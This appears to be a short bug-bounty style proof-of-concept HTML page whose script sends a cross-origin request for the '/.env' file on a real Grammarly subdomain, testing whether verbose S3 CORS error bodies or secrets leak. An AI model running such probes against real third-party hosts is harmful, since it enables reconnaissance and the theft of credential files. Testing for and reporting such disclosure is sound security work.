<!DOCTYPE html>
<html>
<head>
    <title>CORS Verbose Error PoC - Grammarly</title>
    <style>body { font-family: Arial; margin: 40px; } #output { white-space: pre-wrap; background: #f4f4f4; padding: 20px; }</style>
</head>
<body>
    <h2>CORS Verbose Error Test</h2>
    <p>Testing for information disclosure via verbose S3 CORS errors.</p>
    <button onclick="testCorsError()">Test for Verbose Error</button>
    <br><br>
    <div id="output">Results will appear here dear...</div>

    <script>
        async function testCorsError() {
            const output = document.getElementById('output');
            output.textContent = 'Testing...';

            // Test a path that likely doesn't exist
            const testUrl = 'https://officeaddin.grammarly.com/.env';

            try {
                // First, try WITHOUT credentials. We might be able to read the error body even if the origin is blocked.
                const response = await fetch(testUrl, { 
                    method: 'GET',
                    // credentials: 'include' // REMOVED for this test
                });

                // If we get here, the CORS policy might actually allow our origin for errors?
                const text = await response.text();
                output.textContent = `SUCCESS (unlikely): Status: ${response.status}\nResponse: ${text}`;

            } catch (error) {
                // This is where we expect to be. The browser blocks us from reading the response.
                output.textContent = `Network error (expected). The browser blocked the request.\n\nCheck the 'Network' tab in DevTools (F12). Look for the request to ${testUrl}. Click it and check the 'Response' tab for the full XML error.`;
            }
        }
    </script>
</body>
</html>
